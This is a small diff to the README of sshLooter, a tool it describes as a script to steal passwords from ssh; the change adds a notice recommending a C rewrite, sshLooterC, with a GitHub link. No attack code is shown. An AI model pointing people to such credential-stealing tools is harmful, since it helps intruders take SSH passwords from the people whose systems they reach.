@@ -1,3 +1,6 @@
+# DON'T USE THIS
+There's a C version which is much better [sshLooterC](https://github.com/mthbernardes/sshLooterC)
+
 # sshLooter
 Script to steal passwords from ssh.
 
